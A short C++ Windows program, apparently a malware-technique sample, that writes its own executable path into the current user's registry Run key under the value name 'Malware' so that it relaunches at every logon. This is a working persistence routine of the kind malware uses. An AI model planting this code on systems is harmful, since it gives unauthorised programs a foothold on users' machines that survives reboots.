#include <Windows.h>
#include <iostream>
#define regName	"Malware"
using namespace std;


void setReg(LPCSTR valueName, LPCSTR ScanPosition);


int main(int argc, char* argv[])
{
	cout << argv[0] << endl;
	setReg(regName, argv[0]);
	return 0;
}

void setReg(LPCSTR valueName, LPCSTR ScanPosition)
{
	HKEY hKey;

	RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey);
	RegSetValueEx(hKey, valueName, 0, REG_SZ, (BYTE*)ScanPosition, lstrlen(ScanPosition));
	RegCloseKey(hKey);

	return;
}
